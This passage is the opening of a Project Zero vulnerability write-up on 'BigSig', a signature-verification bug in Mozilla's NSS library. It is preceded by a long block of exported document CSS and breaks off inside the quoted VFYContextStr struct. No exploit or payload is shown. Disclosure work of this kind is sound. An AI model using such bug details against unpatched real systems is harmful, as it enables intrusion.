"}.lst-kix_q4elz23jmthh-1&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-1,lower-latin) ". "}.lst-kix_q4elz23jmthh-2&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-2,lower-roman) ". "}.lst-kix_q4elz23jmthh-3&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-3}.lst-kix_q4elz23jmthh-3&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-3,decimal) ". "}ul.lst-kix_ohd9cwgi2ci1-5{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-4{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-7{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-6{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-8{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-2{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-3{list-style-type:none}.lst-kix_oetzaqvyxxoa-6&gt;li:before{content:"\0025cf  "}.lst-kix_oetzaqvyxxoa-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_ugjdqlaeq7aq-0{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-1{list-style-type:none}ol.lst-kix_q4elz23jmthh-5.start{counter-reset:lst-ctn-kix_q4elz23jmthh-5 0}ul.lst-kix_ugjdqlaeq7aq-6{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-7{list-style-type:none}.lst-kix_oetzaqvyxxoa-4&gt;li:before{content:"\0025cb  "}.lst-kix_oetzaqvyxxoa-5&gt;li:before{content:"\0025a0  "}.lst-kix_oetzaqvyxxoa-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_ugjdqlaeq7aq-4{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-5{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-8{list-style-type:none}.lst-kix_x7i5vtjupm2f-2&gt;li:before{content:"\0025a0  "}.lst-kix_x7i5vtjupm2f-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_2fd9br43vo52-4{list-style-type:none}ul.lst-kix_2fd9br43vo52-3{list-style-type:none}.lst-kix_ohd9cwgi2ci1-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_2fd9br43vo52-6{list-style-type:none}ul.lst-kix_2fd9br43vo52-5{list-style-type:none}ul.lst-kix_2fd9br43vo52-8{list-style-type:none}.lst-kix_fvn7czyjg1wz-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_2fd9br43vo52-7{list-style-type:none}.lst-kix_x7i5vtjupm2f-4&gt;li:before{content:"\0025cb  "}.lst-kix_2fd9br43vo52-3&gt;li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_2fd9br43vo52-0{list-style-type:none}.lst-kix_2fd9br43vo52-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_2fd9br43vo52-2{list-style-type:none}ul.lst-kix_2fd9br43vo52-1{list-style-type:none}.lst-kix_4idwybng3hbx-2&gt;li:before{content:"\0025a0  "}.lst-kix_2fd9br43vo52-7&gt;li:before{content:"\0025cb  "}.lst-kix_fvn7czyjg1wz-8&gt;li:before{content:"\0025a0  "}.lst-kix_ohd9cwgi2ci1-1&gt;li:before{content:"\0025cb  "}.lst-kix_4idwybng3hbx-0&gt;li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-6&gt;li:before{content:"\0025cf  "}.lst-kix_x7i5vtjupm2f-0&gt;li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_fvn7czyjg1wz-2{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-1{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-0{list-style-type:none}.lst-kix_wy7koemfbmv1-4&gt;li:before{content:"\0025cb  "}.lst-kix_ugjdqlaeq7aq-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_q4elz23jmthh-7.start{counter-reset:lst-ctn-kix_q4elz23jmthh-7 0}.lst-kix_wy7koemfbmv1-0&gt;li:before{content:"\0025cf  "}.lst-kix_wy7koemfbmv1-2&gt;li:before{content:"\0025a0  "}.lst-kix_ugjdqlaeq7aq-0&gt;li:before{content:"\0025cf  "}.lst-kix_ohd9cwgi2ci1-5&gt;li:before{content:"\0025cf  "}.lst-kix_ohd9cwgi2ci1-7&gt;li:before{content:"\0025cf  "}.lst-kix_2fd9br43vo52-1&gt;li:before{content:"\0025cb  "}.lst-kix_ugjdqlaeq7aq-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_2hgb22nra90i-0{list-style-type:none}ul.lst-kix_2hgb22nra90i-1{list-style-type:none}ul.lst-kix_2hgb22nra90i-2{list-style-type:none}ul.lst-kix_2hgb22nra90i-3{list-style-type:none}.lst-kix_fvn7czyjg1wz-0&gt;li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_2hgb22nra90i-4{list-style-type:none}ul.lst-kix_2hgb22nra90i-5{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-8{list-style-type:none}ul.lst-kix_2hgb22nra90i-6{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-7{list-style-type:none}ul.lst-kix_2hgb22nra90i-7{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-6{list-style-type:none}ul.lst-kix_2hgb22nra90i-8{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-5{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-4{list-style-type:none}.lst-kix_x7i5vtjupm2f-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_fvn7czyjg1wz-3{list-style-type:none}ul.lst-kix_81cegzboe9ky-8{list-style-type:none}ul.lst-kix_81cegzboe9ky-5{list-style-type:none}ul.lst-kix_81cegzboe9ky-4{list-style-type:none}ul.lst-kix_81cegzboe9ky-7{list-style-type:none}ul.lst-kix_81cegzboe9ky-6{list-style-type:none}ol.lst-kix_q4elz23jmthh-8.start{counter-reset:lst-ctn-kix_q4elz23jmthh-8 0}ul.lst-kix_oetzaqvyxxoa-2{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-3{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-0{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-1{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-6{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-7{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-4{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-5{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-8{list-style-type:none}ul.lst-kix_4idwybng3hbx-5{list-style-type:none}ul.lst-kix_4idwybng3hbx-4{list-style-type:none}.lst-kix_81cegzboe9ky-2&gt;li:before{content:"\0025a0  "}.lst-kix_81cegzboe9ky-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_4idwybng3hbx-7{list-style-type:none}ul.lst-kix_4idwybng3hbx-6{list-style-type:none}.lst-kix_wy7koemfbmv1-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_4idwybng3hbx-8{list-style-type:none}.lst-kix_2gk0zovl15u8-4&gt;li:before{content:"\0025cb  "}.lst-kix_81cegzboe9ky-0&gt;li:before{content:"\0025cf  "}.lst-kix_81cegzboe9ky-6&gt;li:before{content:"\0025cf  "}.lst-kix_81cegzboe9ky-8&gt;li:before{content:"\0025a0  "}.lst-kix_wy7koemfbmv1-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_4idwybng3hbx-1{list-style-type:none}ul.lst-kix_4idwybng3hbx-0{list-style-type:none}ul.lst-kix_4idwybng3hbx-3{list-style-type:none}.lst-kix_2gk0zovl15u8-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_4idwybng3hbx-2{list-style-type:none}.lst-kix_prwgb47nvxz6-8&gt;li:before{content:"\0025a0  "}.lst-kix_2gk0zovl15u8-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_81cegzboe9ky-1{list-style-type:none}ul.lst-kix_81cegzboe9ky-0{list-style-type:none}ul.lst-kix_81cegzboe9ky-3{list-style-type:none}ul.lst-kix_81cegzboe9ky-2{list-style-type:none}.lst-kix_z8xtsan2wa5s-3&gt;li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-2&gt;li:before{content:"\0025a0  "}.lst-kix_z8xtsan2wa5s-4&gt;li:before{content:"\0025cb  "}.lst-kix_prwgb47nvxz6-0&gt;li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-1&gt;li:before{content:"\0025cb  "}.lst-kix_z8xtsan2wa5s-5&gt;li:before{content:"\0025a0  "}.lst-kix_prwgb47nvxz6-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_q4elz23jmthh-4{list-style-type:none}ol.lst-kix_q4elz23jmthh-3{list-style-type:none}ol.lst-kix_q4elz23jmthh-3.start{counter-reset:lst-ctn-kix_q4elz23jmthh-3 0}ol.lst-kix_q4elz23jmthh-6{list-style-type:none}ol.lst-kix_q4elz23jmthh-5{list-style-type:none}ol.lst-kix_q4elz23jmthh-0{list-style-type:none}ol.lst-kix_q4elz23jmthh-2{list-style-type:none}ol.lst-kix_q4elz23jmthh-1{list-style-type:none}.lst-kix_prwgb47nvxz6-6&gt;li:before{content:"\0025cf  "}.lst-kix_prwgb47nvxz6-5&gt;li:before{content:"\0025a0  "}.lst-kix_z8xtsan2wa5s-7&gt;li:before{content:"\0025cb  "}.lst-kix_prwgb47nvxz6-3&gt;li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-6&gt;li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-8&gt;li:before{content:"\0025a0  "}.lst-kix_prwgb47nvxz6-2&gt;li:before{content:"\0025a0  "}.lst-kix_prwgb47nvxz6-4&gt;li:before{content:"\0025cb  "}.lst-kix_2gk0zovl15u8-3&gt;li:before{content:"\0025cf  "}.lst-kix_q4elz23jmthh-6&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-6}.lst-kix_2gk0zovl15u8-2&gt;li:before{content:"\0025a0  "}.lst-kix_2gk0zovl15u8-1&gt;li:before{content:"\0025cb  "}.lst-kix_cw1yal3teuur-8&gt;li:before{content:"\0025a0  "}.lst-kix_2gk0zovl15u8-0&gt;li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-6&gt;li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-7&gt;li:before{content:"\0025cb  "}.lst-kix_q4elz23jmthh-4&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-4}ol.lst-kix_q4elz23jmthh-8{list-style-type:none}ol.lst-kix_q4elz23jmthh-7{list-style-type:none}.lst-kix_z8xtsan2wa5s-0&gt;li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-0&gt;li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-2&gt;li:before{content:"\0025a0  "}.lst-kix_cw1yal3teuur-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_q4elz23jmthh-4.start{counter-reset:lst-ctn-kix_q4elz23jmthh-4 0}.lst-kix_cw1yal3teuur-1&gt;li:before{content:"\0025cb  "}.lst-kix_cw1yal3teuur-4&gt;li:before{content:"\0025cb  "}.lst-kix_cw1yal3teuur-5&gt;li:before{content:"\0025a0  "}.lst-kix_4idwybng3hbx-6&gt;li:before{content:"\0025cf  "}.lst-kix_4idwybng3hbx-5&gt;li:before{content:"\0025a0  "}.lst-kix_4idwybng3hbx-7&gt;li:before{content:"\0025cb  "}.lst-kix_q4elz23jmthh-0&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-0}.lst-kix_4idwybng3hbx-3&gt;li:before{content:"\0025cf  "}.lst-kix_4idwybng3hbx-4&gt;li:before{content:"\0025cb  "}.lst-kix_4idwybng3hbx-8&gt;li:before{content:"\0025a0  "}.lst-kix_x7i5vtjupm2f-5&gt;li:before{content:"\0025a0  "}.lst-kix_x7i5vtjupm2f-7&gt;li:before{content:"\0025cb  "}.lst-kix_x7i5vtjupm2f-3&gt;li:before{content:"\0025cf  "}.lst-kix_ohd9cwgi2ci1-4&gt;li:before{content:"\0025cf  "}.lst-kix_2fd9br43vo52-2&gt;li:before{content:"\0025a0  "}.lst-kix_fvn7czyjg1wz-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_x7i5vtjupm2f-8{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-1{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-4{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-0{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-5{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-3{list-style-type:none}.lst-kix_2fd9br43vo52-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_x7i5vtjupm2f-6{list-style-type:none}.lst-kix_fvn7czyjg1wz-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_ohd9cwgi2ci1-2{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-7{list-style-type:none}.lst-kix_ohd9cwgi2ci1-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_x7i5vtjupm2f-0{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-1{list-style-type:none}ul.lst-kix_prwgb47nvxz6-8{list-style-type:none}.lst-kix_4idwybng3hbx-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_x7i5vtjupm2f-2{list-style-type:none}.lst-kix_x7i5vtjupm2f-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_x7i5vtjupm2f-3{list-style-type:none}.lst-kix_ohd9cwgi2ci1-0&gt;li:before{content:"\0025cf  "}.lst-kix_2fd9br43vo52-6&gt;li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-7&gt;li:before{content:"\0025cb  "}.lst-kix_wy7koemfbmv1-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_prwgb47nvxz6-2{list-style-type:none}ul.lst-kix_prwgb47nvxz6-3{list-style-type:none}ul.lst-kix_prwgb47nvxz6-0{list-style-type:none}ul.lst-kix_prwgb47nvxz6-1{list-style-type:none}ul.lst-kix_prwgb47nvxz6-6{list-style-type:none}ul.lst-kix_prwgb47nvxz6-7{list-style-type:none}ul.lst-kix_prwgb47nvxz6-4{list-style-type:none}ul.lst-kix_prwgb47nvxz6-5{list-style-type:none}.lst-kix_wy7koemfbmv1-3&gt;li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-7&gt;li:before{content:"\0025cb  "}.lst-kix_wy7koemfbmv1-1&gt;li:before{content:"\0025cb  "}.lst-kix_ohd9cwgi2ci1-6&gt;li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-1&gt;li:before{content:"\0025cb  "}.lst-kix_2fd9br43vo52-0&gt;li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-1&gt;li:before{content:"\0025cb  "}.lst-kix_ugjdqlaeq7aq-5&gt;li:before{content:"\0025a0  "}.lst-kix_ugjdqlaeq7aq-3&gt;li:before{content:"\0025cf  "}.lst-kix_q4elz23jmthh-1&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-1}.lst-kix_ohd9cwgi2ci1-8&gt;li:before{content:"\0025cf  "}ol.lst-kix_q4elz23jmthh-1.start{counter-reset:lst-ctn-kix_q4elz23jmthh-1 0}.lst-kix_q4elz23jmthh-8&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-8}.lst-kix_q4elz23jmthh-2&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-2}.lst-kix_81cegzboe9ky-3&gt;li:before{content:"\0025cf  "}.lst-kix_81cegzboe9ky-1&gt;li:before{content:"\0025cb  "}.lst-kix_81cegzboe9ky-5&gt;li:before{content:"\0025a0  "}.lst-kix_2fd9br43vo52-8&gt;li:before{content:"\0025a0  "}.lst-kix_wy7koemfbmv1-7&gt;li:before{content:"\0025cb  "}.lst-kix_81cegzboe9ky-7&gt;li:before{content:"\0025cb  "}.lst-kix_2gk0zovl15u8-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_2gk0zovl15u8-0{list-style-type:none}ul.lst-kix_2gk0zovl15u8-2{list-style-type:none}.lst-kix_2gk0zovl15u8-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_2gk0zovl15u8-1{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_2gk0zovl15u8-4{list-style-type:none}ul.lst-kix_2gk0zovl15u8-3{list-style-type:none}ul.lst-kix_cw1yal3teuur-5{list-style-type:none}.lst-kix_prwgb47nvxz6-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_2gk0zovl15u8-6{list-style-type:none}ul.lst-kix_cw1yal3teuur-4{list-style-type:none}ul.lst-kix_2gk0zovl15u8-5{list-style-type:none}ul.lst-kix_cw1yal3teuur-7{list-style-type:none}ul.lst-kix_2gk0zovl15u8-8{list-style-type:none}ul.lst-kix_cw1yal3teuur-6{list-style-type:none}ul.lst-kix_2gk0zovl15u8-7{list-style-type:none}ul.lst-kix_cw1yal3teuur-8{list-style-type:none}ul.lst-kix_cw1yal3teuur-1{list-style-type:none}ol.lst-kix_q4elz23jmthh-2.start{counter-reset:lst-ctn-kix_q4elz23jmthh-2 0}ul.lst-kix_cw1yal3teuur-0{list-style-type:none}ul.lst-kix_cw1yal3teuur-3{list-style-type:none}ul.lst-kix_cw1yal3teuur-2{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c15{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c6{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c31{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.3;text-align:left;height:11pt}.c13{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c19{background-color:#ffffff;font-size:8pt;font-family:Consolas,"Courier New";color:#009900;font-weight:400}.c34{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.3;text-align:left}.c12{background-color:#ffffff;font-size:8pt;font-family:Consolas,"Courier New";color:#993333;font-weight:400}.c1{background-color:#ffffff;font-size:8pt;font-family:Consolas,"Courier New";color:#212529;font-weight:400}.c45{color:#333333;text-decoration:none;vertical-align:baseline;font-size:30pt;font-family:"Amatic SC"}.c7{font-size:8pt;font-family:Consolas,"Courier New";color:#333333;font-weight:400}.c4{margin-left:36pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.c14{border-spacing:0;border-collapse:collapse;margin-right:auto}.c26{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c11{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c10{font-size:8pt;font-family:Consolas,"Courier New";color:#0000ff;font-weight:400}.c40{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.c24{color:#000000;font-weight:700;font-size:11pt;font-family:"Arial"}.c0{font-size:9pt;font-family:Consolas,"Courier New";color:#333333;font-weight:400}.c18{font-size:8pt;font-family:Consolas,"Courier New";color:#008080;font-weight:400}.c5{font-size:9pt;font-family:Consolas,"Courier New";color:#0000ff;font-weight:400}.c30{color:#000000;font-weight:400;font-size:10pt;font-family:"Arial"}.c42{background-color:#ffffff;font-size:8pt;color:#b1b100}.c47{font-weight:400;font-size:8pt;font-family:"Arial"}.c28{background-color:#ffffff;font-size:8pt;color:#000066}.c38{background-color:#ffffff;font-size:8pt;color:#ff0000}.c23{background-color:#ffffff;font-size:8pt;color:#339933}.c8{text-decoration:none;vertical-align:baseline;font-style:normal}.c50{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c46{text-decoration:none;vertical-align:baseline;font-style:italic}.c51{background-color:#ffffff;font-size:8pt;color:#0000dd}.c9{color:inherit;text-decoration:inherit}.c27{margin-left:36pt;padding-left:0pt}.c17{padding:0;margin:0}.c22{font-size:9pt;color:#008000}.c21{font-weight:400;font-family:Consolas,"Courier New"}.c33{orphans:2;widows:2}.c44{width:33%;height:1px}.c35{font-weight:400;font-style:italic}.c48{font-size:8pt;color:#8b0000}.c29{height:0pt}.c39{font-size:11pt}.c32{font-weight:700}.c41{font-size:10pt}.c20{vertical-align:super}.c49{height:11pt}.c36{color:#000000}.c16{page-break-after:avoid}.c37{font-size:5pt}.c43{margin-left:36pt}.c25{font-size:9pt}.title{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#000000;font-size:10pt;padding-bottom:0pt;font-family:"Arial";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:0pt;color:#000000;font-weight:700;font-size:11pt;padding-bottom:0pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c50"&gt;&lt;div&gt; &lt;p class="c3 c33 c16 subtitle" id="h.hkm9sn4jh6p1"&gt;&lt;span class="c30 c8"&gt;Posted by Tavis Ormandy, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13 c16" id="h.ce7bhufj5ofg"&gt;&lt;span class="c24 c8"&gt;Introduction&lt;/span&gt;&lt;/h1&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;This is an unusual blog post. I normally write posts to highlight some hidden attack surface or interesting complex vulnerability class. This time, I want to talk about a vulnerability that is neither of those things. The striking thing about this vulnerability is just how simple it is. This should have been caught earlier, and I want to explore why that didn&amp;rsquo;t happen.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;In 2021, all good bugs need a catchy name, so I&amp;rsquo;m calling this one &amp;ldquo;BigSig&amp;rdquo;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;First, let&amp;rsquo;s take a look at the bug, I&amp;rsquo;ll explain how I found it and then try to understand why we missed it for so long.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13 c16" id="h.7ttrpxxbs2f9"&gt;&lt;span class="c24 c8"&gt;Analysis&lt;/span&gt;&lt;/h1&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Overview"&gt;Network Security Services&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(NSS) is Mozilla&amp;#39;s widely used, cross-platform cryptography library. &lt;/span&gt;&lt;span&gt;When you verify an ASN.1 encoded digital signature&lt;/span&gt;&lt;span&gt;, NSS will create a &lt;/span&gt;&lt;span class="c26 c21"&gt;&lt;a class="c91" href="https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/cryptohi/secvfy.c#120"&gt;VFYContext&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;structure to store the necessary data. This includes things like the public key, the hash algorithm, and the signature itself.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9a4d5980e1b13f527ae3eec9673b5d4e7a7010ba"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c14"&gt;&lt;tbody&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c10"&gt;struct&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;VFYContextStr&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;SECOidTag&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;hashAlg; &lt;/span&gt;&lt;span class="c21 c48"&gt;/* the hash algorithm */&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;SECKEYPublicKey&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;*key;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;union&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;unsigned&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;char&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;buffer[1];&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;unsigned&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;char&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;dsasig[DSA_MAX_SIGNATURE_LEN];&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;unsigned&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;char&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;ecdsasig[2 * MAX_ECKEY_LEN];&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;unsigned&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;char&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;rsasig[(RSA_MAX_MODULUS_BITS + 7) / 8];&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp;} u;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;unsigned&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;int&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;pkcs1RSADigestInfoLen;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;unsigned&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;char&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;*pkcs1RSADigestInfo;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;void&lt;/span&gt;&lt;span class="c7 